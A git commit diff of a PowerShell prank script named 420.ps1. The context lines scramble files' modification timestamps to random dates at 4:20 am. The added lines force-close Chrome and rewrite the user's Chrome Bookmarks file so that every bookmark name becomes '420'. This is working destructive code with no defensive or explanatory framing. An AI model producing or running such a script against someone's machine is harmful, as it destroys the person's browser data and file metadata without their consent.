db20b9f4c7914b7214a601f1ef6819646ce7aad3
cucumberalert <59238141+cucumberalert@users.noreply.github.com>
2020-02-22 14:06:27 +1100

    Update 420.ps1

--- 420.ps1
+++ 420.ps1
@@ -14,3 +14,13 @@ $rand3 = get-random -minimum 1981 -maximum 2107
 
     $_.LastWriteTime = "$rand1/$rand2/$rand3 4:20 am"
 }
+
+$Directory2 = "$($env:USERPROFILE)"
+
+Get-Process Chrome -ErrorAction SilentlyContinue | Stop-Process -Force
+
+Rename-Item -Path "$Directory2\AppData\Local\Google\Chrome\User Data\Default\Bookmarks" -NewName "Bookmarks.json"
+
+((Get-Content -path "$Directory2\AppData\Local\Google\Chrome\User Data\Default\Bookmarks.json") -replace '(?<="name": ").*?(?=")', '420') | Set-Content -Path "$Directory2\AppData\Local\Google\Chrome\User Data\Default\Bookmarks.json"
+
+Rename-Item -Path "$Directory2\AppData\Local\Google\Chrome\User Data\Default\Bookmarks.json" -NewName "Bookmarks"
